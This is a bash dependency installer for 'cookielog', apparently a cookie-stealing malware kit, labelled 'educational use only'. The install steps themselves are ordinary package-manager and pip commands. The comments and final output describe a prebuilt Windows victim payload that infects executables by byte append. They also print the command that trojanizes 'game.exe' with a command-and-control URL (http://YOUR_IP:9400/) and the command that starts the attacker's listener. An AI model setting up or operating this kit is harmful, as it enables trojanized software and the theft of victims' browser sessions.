#!/usr/bin/env bash
# ==============================================================================
# install.sh -- cookielog dependency installer (Linux / macOS)
# EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
#
# Installs everything the ATTACKER side needs on Linux:
#   1. python3 + pip + tkinter (system packages; tkinter is optional, GUI only)
#   2. pip packages from requirements.txt (cryptography, websocket-client)
#   3. CLI tools: fzf, bat, ripgrep -- via the system package manager
#
# The victim-side payload (bin/loader.exe, bin/ckdll.dll) is Windows-only and
# ships PREBUILT in bin/ -- infection is a byte append and needs no compiler
# here. There is no MSVC / build step on Linux by design.
#
# Usage:
#   ./install.sh              :: install everything
#   ./install.sh --no-tools   :: skip CLI tools (fzf, bat, ripgrep)
#   ./install.sh --no-build   :: accepted for parity with install.bat (no-op)
#   ./install.sh --check      :: check what is installed, install nothing
#
# Run from the cookielog directory.
# ==============================================================================
set -u
cd "$(dirname "$0")"

DO_TOOLS=1
CHECK_ONLY=0

for arg in "$@"; do
    case "$arg" in
        --no-tools) DO_TOOLS=0 ;;
        --no-build) echo "[*] --no-build is a no-op on Linux (there is no build step)" ;;
        --check)    CHECK_ONLY=1; DO_TOOLS=0 ;;
        *) echo "[-] unknown option: $arg" ;;
    esac
done

echo "=============================================================================="
echo "  cookielog -- dependency installer (Linux)"
echo "  EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING"
echo "=============================================================================="
echo

# --- detect package manager -------------------------------------------------
PKG=""
SUDO=""
if command -v apt-get >/dev/null 2>&1; then
    PKG="apt";     [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v dnf >/dev/null 2>&1; then
    PKG="dnf";     [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v pacman >/dev/null 2>&1; then
    PKG="pacman";  [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v zypper >/dev/null 2>&1; then
    PKG="zypper";  [ "$(id -u)" -ne 0 ] && SUDO="sudo"
elif command -v brew >/dev/null 2>&1; then
    PKG="brew"
fi

# --- 1. python3 + pip + tkinter ---------------------------------------------
echo "[1/3] python3 + pip + tkinter..."
echo "=============================================================================="
if ! command -v python3 >/dev/null 2>&1; then
    if [ "$CHECK_ONLY" = "1" ]; then
        echo "    [-] python3 NOT installed"
    elif [ -n "$PKG" ]; then
        echo "[*] installing python3 via $PKG..."
        case "$PKG" in
            apt)   $SUDO apt-get update && $SUDO apt-get install -y python3 python3-pip python3-venv ;;
            dnf)   $SUDO dnf install -y python3 python3-pip ;;
            pacman) $SUDO pacman -Sy --noconfirm python python-pip ;;
            zypper) $SUDO zypper install -y python3 python3-pip ;;
            brew)  brew install python3 ;;
        esac
        command -v python3 >/dev/null 2>&1 && echo "    [+] python3 installed" || { echo "    [-] python3 install failed"; exit 1; }
    else
        echo "    [-] python3 not found and no supported package manager (apt/dnf/pacman/zypper/brew)"
        echo "        install Python 3.8+ from https://python.org and re-run"
        exit 1
    fi
else
    echo "    [+] python3: $(python3 -V 2>&1)"
fi

PYTK=""
if python3 -c "import tkinter" >/dev/null 2>&1; then
    echo "    [+] tkinter available (pick.py GUI works)"
else
    echo "    [-] tkinter missing: pick.py GUI needs the system package"
    if [ "$CHECK_ONLY" = "0" ]; then
        case "$PKG" in
            apt)    $SUDO apt-get install -y python3-tk && echo "    [+] python3-tk installed" ;;
            dnf)    $SUDO dnf install -y python3-tkinter && echo "    [+] tkinter installed" ;;
            pacman) $SUDO pacman -Sy --noconfirm tk && echo "    [+] tk installed" ;;
            zypper) $SUDO zypper install -y python3-tk && echo "    [+] tkinter installed" ;;
            brew)   brew install python-tk && echo "    [+] python-tk installed" ;;
            *)      echo "    [*] install python3-tk manually if you want the GUI" ;;
        esac
    fi
fi

# pip module (python3-pip may still be missing if python3 came preinstalled)
if ! python3 -m pip --version >/dev/null 2>&1; then
    if [ "$CHECK_ONLY" = "0" ] && [ -n "$PKG" ]; then
        echo "[*] installing pip via $PKG..."
        case "$PKG" in
            apt)    $SUDO apt-get install -y python3-pip ;;
            dnf)    $SUDO dnf install -y python3-pip ;;
            pacman) $SUDO pacman -Sy --noconfirm python-pip ;;
            zypper) $SUDO zypper install -y python3-pip ;;
            brew)   brew install python3 ;;
        esac
    fi
fi

# --- 2. pip packages ---------------------------------------------------------
echo
echo "[2/3] pip packages (requirements.txt: cryptography, websocket-client)..."
echo "=============================================================================="
if python3 -c "import cryptography, websocket" >/dev/null 2>&1; then
    echo "    [+] already installed"
elif [ "$CHECK_ONLY" = "1" ]; then
    echo "    [-] NOT installed"
else
    # PEP 668 (externally-managed environment, Debian 12+/Ubuntu 23+/Fedora):
    # --user alone fails, so fall back to --break-system-packages only when needed
    if ! python3 -m pip install -r requirements.txt 2>/dev/null \
       && ! python3 -m pip install --user -r requirements.txt 2>/dev/null \
       && ! python3 -m pip install --break-system-packages -r requirements.txt; then
        echo "    [-] pip install failed. Alternatives:"
        echo "        python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt"
        exit 1
    fi
    echo "    [+] pip packages installed"
fi

# --- 3. CLI tools ------------------------------------------------------------
echo
echo "[3/3] CLI tools (fzf, bat, ripgrep)..."
echo "=============================================================================="
if [ "$DO_TOOLS" = "1" ] && [ "$CHECK_ONLY" = "0" ] && [ -n "$PKG" ]; then
    case "$PKG" in
        apt)    $SUDO apt-get install -y fzf bat ripgrep ;;
        dnf)    $SUDO dnf install -y fzf bat ripgrep ;;
        pacman) $SUDO pacman -Sy --noconfirm fzf bat ripgrep ;;
        zypper) $SUDO zypper install -y fzf bat ripgrep ;;
        brew)   brew install fzf bat ripgrep ;;
    esac
fi
for t in "fzf" "bat" "rg"; do
    if command -v "$t" >/dev/null 2>&1; then
        echo "    [+] $t"
    else
        echo "    [-] $t not installed"
    fi
done

# --- summary -----------------------------------------------------------------
echo
echo "=============================================================================="
echo "  summary"
echo "=============================================================================="
# Debian/Ubuntu/Fedora/openSUSE name the interpreter python3; Arch names it python
PYBIN="$(command -v python3 || command -v python)"
if [ -n "$PYBIN" ]; then
    echo "  interpreter:  $PYBIN ($($PYBIN -V 2>&1))"
    "$PYBIN" -m pip --version >/dev/null 2>&1 && echo "  pip:          ok" || echo "  pip:          MISSING"
    "$PYBIN" -c "import tkinter" >/dev/null 2>&1 && echo "  tkinter:      ok" || echo "  tkinter:      missing (pick.py GUI only)"
    "$PYBIN" -c "import cryptography, websocket" >/dev/null 2>&1 && echo "  pip packages: ok" || echo "  pip packages: MISSING"
    if ! command -v python3 >/dev/null 2>&1; then
        echo "  note:         Arch-style system: the interpreter is 'python' (3.x), not 'python3'."
        echo "                run commands as 'python auto.py ...', or once: ln -s $PYBIN ~/.local/bin/python3"
    fi
else
    echo "  python3:      MISSING"
fi
[ -f bin/loader.exe ] && echo "  loader.exe:   prebuilt present" || echo "  loader.exe:   MISSING (copy bin/ from a Windows build machine)"
[ -f bin/ckdll.dll ]  && echo "  ckdll.dll:    prebuilt present" || echo "  ckdll.dll:    MISSING (copy bin/ from a Windows build machine)"
echo
echo "Victim side (bin/) is Windows-only by design -- build there once, then"
echo "infect from Linux:  python3 auto.py game.exe --c2 http://YOUR_IP:9400/"
echo "Start the listener: python3 listen.py 9400"
[ "$CHECK_ONLY" = "1" ] && echo "Done (check only -- nothing was installed)."
exit 0
